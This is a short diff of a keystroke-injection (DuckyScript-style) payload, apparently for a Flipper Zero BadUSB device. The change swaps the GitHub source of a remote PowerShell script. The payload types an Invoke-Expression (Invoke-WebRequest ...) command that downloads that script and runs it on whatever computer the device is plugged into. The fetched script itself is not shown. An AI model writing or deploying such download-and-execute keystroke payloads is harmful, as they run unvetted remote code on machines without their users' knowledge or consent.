@@ -13,6 +13,6 @@ LEFTARROW
 DELAY 800
 ENTER
 DELAY 500
-STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UNC0V3R3D/resources/main/dpi_code.ps1").Content
+STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JLH993/flipperzero_resources/main/dpi_code.ps1").Content
 DELAY 200
 ENTER
